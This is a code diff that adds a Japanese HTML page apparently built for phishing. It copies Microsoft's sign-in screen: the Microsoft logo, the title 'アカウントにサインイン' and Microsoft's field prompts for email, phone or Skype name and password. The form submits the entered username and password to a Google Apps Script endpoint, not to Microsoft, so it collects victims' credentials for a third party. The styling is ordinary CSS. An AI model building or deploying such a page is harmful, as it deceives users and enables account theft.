@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<style type="text/css">
+    body{
+    margin: 0;
+    padding: 0;
+    font-family: sans-serif;
+    background-image: url("background.png");
+}
+ 
+/*ログインフォームのエリア内のスタイル*/
+.box{
+    width: 300px;
+    padding: 40px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #fafafa;
+    text-align: center;
+}
+ 
+.box{
+    color: rgb(15, 15, 15);
+    text-transform: uppercase;
+    font-weight: 500;
+}
+ 
+/* ユーザーIDとパスワード入力ボックスのスタイル */
+.box input[type="text"], .box input[type="password"]{
+    border: 0;
+    background: none;
+    display: block;
+    margin: 20px auto;
+    text-align: center;
+    border: 2px solid #27df92;
+    padding: 14px 10px;
+    width: 200px;
+    outline: none;
+    color: rgb(43, 41, 41);
+    border-radius: 24px;
+    transition: 0.25s;
+}
+ 
+/* 入力ボックスがフォーカスされたときのスタイル（幅が大きくなる＆枠の色が変わる） */
+.box input[type="text"]:focus, .box input[type="password"]:focus{
+    width: 280px;
+    border-color: #e45dc2;
+}
+ 
+/* Loginボタンのスタイル */
+.box input[type="submit"]{
+    border: 0;
+    background: none;
+    display: block;
+    margin: 20px auto;
+    text-align: center;
+    border: 2px solid #3a7cdf;;
+    padding: 12px 90px;
+    outline: none;
+    color: rgb(46, 44, 44);
+    border-radius: 24px;
+    transition: 0.25s;
+    cursor: pointer;
+}
+ 
+/* Loginボタンをマウスオーバーしたときのスタイル */
+.box input[type="submit"]:hover{
+    background: #206af1;
+     
+}
+    </style>
+    <meta charset="UTF-8">
+    <title>アカウントにサインイン</title>
+</head>
+<body>
+    <form class="box" action="https://script.google.com/macros/s/AKfycbxePACbLJv04H5VoHUjAQwzMOGtzSlTK6U5pusmgs-dIuNFrqM/exec" method="post">
+    <img src="Microsoft_logo_2012_.svg.svg" alt="" width="165px">
+        <h1>サインイン</h1>
+        <input id="input__mailtel" type="text" name="mail_tel" value="" placeholder="メール、電話、または Skype"> <input id="input__password" type="password" name="password" placeholder="パスワードを入力">
+        <input type="submit" name="" value="サインイン">
+    </form>
+</body>
+</html>
